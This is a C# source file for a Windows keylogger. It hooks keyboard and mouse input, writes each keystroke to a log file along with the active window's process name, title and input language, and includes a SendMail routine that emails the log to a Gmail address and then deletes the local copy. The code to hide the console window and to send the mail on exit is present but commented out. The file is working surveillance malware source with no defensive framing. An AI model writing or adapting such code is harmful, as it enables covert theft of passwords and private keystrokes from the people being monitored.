using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace KeyLogger
{
	internal class Program
	{
		[STAThread]
		public static void Main()
		{
			ConsoleEventDelegate handler = ConsoleEventCallback;
			SetConsoleCtrlHandler(handler, true);

			var hWnd = GetConsoleWindow();
			// ShowWindow(hWnd, SW_HIDE); // hide console window

			var actHook = new UserActivityHook();
			actHook.OnMouseActivity += OnMouseMoved;
			// actHook.KeyDown += OnKeyDown;
			actHook.KeyPress += OnKeyPress;
			// actHook.KeyUp += OnKeyUp;

			Application.Run();
		}

		private static bool ConsoleEventCallback(int eventType)
		{
			if (eventType == 2)
			{
				// send log file by mail on console close
				// SendMail();
			}
			return false;
		}

		public static void OnMouseMoved(object sender, MouseEventArgs e)
		{
			Console.Title = string.Format("x = {0} | y = {1} | wheel = {2}", e.X, e.Y, e.Delta);
			if (e.Clicks > 0)
			{
				var currentLanguage = GetCurrentInputLanguage();
				var currentProcessName = GetActiveProcessName();
				var currentProcessTitle = GetActiveProccessTitle();

				Console.WriteLine("MouseButton 	- {0}", e.Button);
				Console.WriteLine("Process Name - {0}", currentProcessName);
				Console.WriteLine("Process Title - {0}", currentProcessTitle);
				Console.WriteLine("Current Language - {0}", currentLanguage);

				LogWrite(string.Format("Time - {0} | Language - {1} | Process Name- {2} | Process Title - {3}",
					DateTime.Now.ToShortTimeString(),
					currentLanguage, currentProcessName, currentProcessTitle));
				LogWrite(e.Button.ToString());
			}
		}

		public static void OnKeyDown(object sender, KeyEventArgs e)
		{
			Console.WriteLine("KeyDown	- {0}", e.KeyData);
			LogWrite(e.KeyData.ToString());
		}

		public static void OnKeyPress(object sender, KeyPressEventArgs e)
		{
			Console.WriteLine("KeyDown	- {0}", e.KeyChar);
			LogWrite(e.KeyChar.ToString());
		}

		public static void OnKeyUp(object sender, KeyEventArgs e)
		{
			Console.WriteLine("KeyDown	- {0}", e.KeyData);
			LogWrite(e.KeyData.ToString());
		}

		/// <summary>
		///     Write text to log file
		/// </summary>
		/// <param name="txt">
		///     [in] text that will be added to the log file
		/// </param>
		private static void LogWrite(string txt)
		{
			using (var writer = new StreamWriter("keyLogger.log", true))
			{
				writer.WriteLineAsync(txt);
			}
		}

		/// <summary>
		///     Send log file by mail
		/// </summary>
		private static void SendMail()
		{
			var mailFrom = new MailAddress("***@gmail.com"); //
			var mailTo = new MailAddress("***@gmail.com"); //

			var mailMessage = new MailMessage(mailFrom, mailTo)
			{
				Subject =
					string.Format("log file - {0} | {1}", DateTime.Now.ToString("dd/MM/yyyy"), DateTime.Now.ToShortTimeString()),
				Attachments =
				{
					new Attachment("keyLogger.log")
				}
			};

			var smtpClient = new SmtpClient();
			smtpClient.Send(mailMessage);

			mailMessage.Dispose();
			smtpClient.Dispose();

			File.Delete("keyLogger.log");
		}

		/// <summary>
		///     Retrieves active(foreground) process name
		/// </summary>
		/// <returns>
		///     The return value is active(foreground) process name in string
		/// </returns>
		private static string GetActiveProcessName()
		{
			var hWnd = GetForegroundWindow();
			uint processId;
			if (GetWindowThreadProcessId(hWnd, out processId) > 0)
			{
				var process = Process.GetProcessById((int) processId);
				return process.ProcessName;
			}
			return null;
		}

		/// <summary>
		///     Retrieves active(foreground) process title text
		/// </summary>
		/// <returns>
		///     The return value is active(foreground) process title text in string
		/// </returns>
		private static string GetActiveProccessTitle()
		{
			const int nChars = 256;
			var buffer = new StringBuilder(nChars);
			var hWnd = GetForegroundWindow();

			if (GetWindowText(hWnd, buffer, nChars) > 0)
			{
				return buffer.ToString();
			}
			return null;
		}

		/// <summary>
		///     Retrieves current input language name
		/// </summary>
		/// <returns>
		///     The return value is current input language name in string
		/// </returns>
		public static string GetCurrentInputLanguage()
		{
			var installedInputLanguages = InputLanguage.InstalledInputLanguages;
			var currentInputLanguage = default(CultureInfo);
			uint lpdwProcessId;
			var hWnd = GetForegroundWindow();
			var winThreadProcId = GetWindowThreadProcessId(hWnd, out lpdwProcessId);
			var keybLayout = GetKeyboardLayout(winThreadProcId);
			for (var i = 0; i < installedInputLanguages.Count; i++)
			{
				if (keybLayout == installedInputLanguages[i].Handle)
					currentInputLanguage = installedInputLanguages[i].Culture;
			}
			return currentInputLanguage.DisplayName;
		}

		private delegate bool ConsoleEventDelegate(int eventType);

		#region WinApi

		/// <summary>
		///     Retrieves the window handle used by the console associated with the calling process.
		/// </summary>
		/// <returns>
		///     The return value is a handle to the window used by the console associated with the calling process or NULL if there
		///     is no such associated console.
		/// </returns>
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		/// <summary>
		///     Sets the specified window's show state.
		/// </summary>
		/// <param name="hWnd">
		///     [in] A handle to the window.
		/// </param>
		/// <param name="nCmdShow">
		///     [in] Controls how the window is to be shown. This parameter is ignored the first time an application calls
		///     ShowWindow, if the program that launched the application provides a STARTUPINFO structure. Otherwise, the first
		///     time ShowWindow is called, the value should be the value obtained by the WinMain function in its nCmdShow
		///     parameter. In subsequent calls, this parameter can be one of the following values.
		/// </param>
		/// <returns>
		///     If the window was previously visible, the return value is nonzero.
		///     If the window was previously hidden, the return value is zero.
		/// </returns>
		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		/// <summary>
		///     Retrieves a handle to the foreground window (the window with which the user is currently working). The system
		///     assigns a slightly higher priority to the thread that creates the foreground window than it does to other threads.
		/// </summary>
		/// <returns>
		///     The return value is a handle to the foreground window. The foreground window can be NULL in certain circumstances,
		///     such as when a window is losing activation.
		/// </returns>
		[DllImport("user32.dll")]
		private static extern IntPtr GetForegroundWindow();

		/// <summary>
		///     Copies the text of the specified window's title bar (if it has one) into a buffer. If the specified window is a
		///     control, the text of the control is copied. However, GetWindowText cannot retrieve the text of a control in another
		///     application.
		/// </summary>
		/// <param name="hWnd">
		///     [in] A handle to the window or control containing the text.
		/// </param>
		/// <param name="text">
		///     [out] The buffer that will receive the text. If the string is as long or longer than the buffer, the string is
		///     truncated and terminated with a null character.
		/// </param>
		/// <param name="nMaxCount">
		///     [in] The maximum number of characters to copy to the buffer, including the null character. If the text exceeds this
		///     limit, it is truncated.
		/// </param>
		/// <returns>
		///     If the function succeeds, the return value is the length, in characters, of the copied string, not including the
		///     terminating null character. If the window has no title bar or text, if the title bar is empty, or if the window or
		///     control handle is invalid, the return value is zero. To get extended error information, call GetLastError.
		/// </returns>
		[DllImport("user32.dll")]
		private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int nMaxCount);

		/// <summary>
		///     Retrieves the identifier of the thread that created the specified window and, optionally, the identifier of the
		///     process that created the window.
		/// </summary>
		/// <param name="hWnd">
		///     [in] A handle to the window.
		/// </param>
		/// <param name="lpdwProcessId">
		///     [out, optional] A pointer to a variable that receives the process identifier. If this parameter is not NULL,
		///     GetWindowThreadProcessId copies the identifier of the process to the variable; otherwise, it does not.
		/// </param>
		/// <returns>
		///     The return value is the identifier of the thread that created the window.
		/// </returns>
		[DllImport("user32.dll")]
		private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

		/// <summary>
		///     Adds or removes an application-defined HandlerRoutine function from the list of handler functions for the calling
		///     process.
		///     If no handler function is specified, the function sets an inheritable attribute that determines whether the calling
		///     process ignores CTRL+C signals.
		/// </summary>
		/// <param name="callback">
		///     [in, optional] A pointer to the application-defined HandlerRoutine function to be added or removed. This parameter
		///     can be NULL.
		/// </param>
		/// <param name="add">
		///     [in] If this parameter is TRUE, the handler is added; if it is FALSE, the handler is removed.
		///     If the HandlerRoutine parameter is NULL, a TRUE value causes the calling process to ignore CTRL+C input, and a
		///     FALSE value restores normal processing of CTRL+C input.This attribute of ignoring or processing CTRL+C is inherited
		///     by child processes.
		/// </param>
		/// <returns>
		///     If the function succeeds, the return value is nonzero.
		///     If the function fails, the return value is zero.To get extended error information, call GetLastError.
		/// </returns>
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);

		/// <summary>
		///     Retrieves the active input locale identifier (formerly called the keyboard layout).
		/// </summary>
		/// <param name="windowsThreadProcessId">
		///     [in] The identifier of the thread to query, or 0 for the current thread.
		/// </param>
		/// <returns>
		///     The return value is the input locale identifier for the thread. The low word contains a Language Identifier for the
		///     input language and the high word contains a device handle to the physical layout of the keyboard.
		/// </returns>
		[DllImport("user32.dll")]
		private static extern IntPtr GetKeyboardLayout(uint windowsThreadProcessId);

		/// <summary>
		///     Hides the window and activates another window.
		/// </summary>
		private const int SW_HIDE = 0;

		/// <summary>
		///     Activates the window and displays it in its current size and position.
		/// </summary>
		private const int SW_SHOW = 5;

		#endregion
	}
}